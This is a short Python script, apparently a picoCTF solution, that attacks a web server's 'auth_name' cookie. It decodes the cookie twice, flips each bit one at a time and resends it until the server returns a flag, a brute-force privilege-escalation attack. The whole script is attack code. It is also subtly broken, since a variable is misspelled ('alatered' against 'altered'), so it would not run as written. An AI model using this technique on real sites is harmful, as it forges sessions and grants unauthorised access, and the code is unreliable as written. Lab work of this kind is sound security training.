import base64
import requests
from tqdm import tqdm

URL = "http://wily-courier.picoctf.net:63325/"

s = requests.Session()
s.get(URL)
cookie = s.cookies["auth_name"]

decoded_cookie = base64.b64decode(cookie)
raw_cookie = bytearray(base64.b64decode(decoded_cookie))

def bitFlip(pos: int, bit_idx: int) -> str:
    alatered = raw_cookie[:]
    altered[pos] ^= (1 << bit_idx)
    return base64.b64encode(base64.b64encode(bytes(altered))).decode()

def exploit():
    for pos in tqdm(range(len(raw_cookie))):
        for bit_idx in range(8):
            guess = bitFlip(pos, bit_idx)

            r = requests.get(URL, cookies={"auth_name": guess})

            if "picoCTF{" in r.text:
                print(f"Admin bit found in byte {pos} bit {bit_idx}.")
                print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
                return

exploit()

